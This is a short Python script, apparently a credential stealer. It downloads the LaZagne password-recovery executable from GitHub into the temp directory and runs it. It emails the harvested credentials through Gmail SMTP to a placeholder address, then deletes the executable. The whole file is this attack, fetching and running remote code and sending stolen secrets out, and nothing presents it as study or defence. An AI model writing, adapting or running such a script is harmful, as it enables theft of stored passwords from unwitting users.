import requests
import subprocess
import os
import smtplib
import tempfile


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

try:
    download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe")

    try:
        result = subprocess.check_output("LaZagne.exe", shell=True, stderr=subprocess.STDOUT)
        result_text = result.decode('utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        result_text = f"Program execution failed:\n{e.output.decode('utf-8', errors='ignore')}"
    send_mail("example@gmail.com", "123454567", result_text)

except Exception as e:
    print(f"An error occurred: {e}")

finally:
	if os.path.exists("LaZagne.exe"):
        os.remove("LaZagne.exe")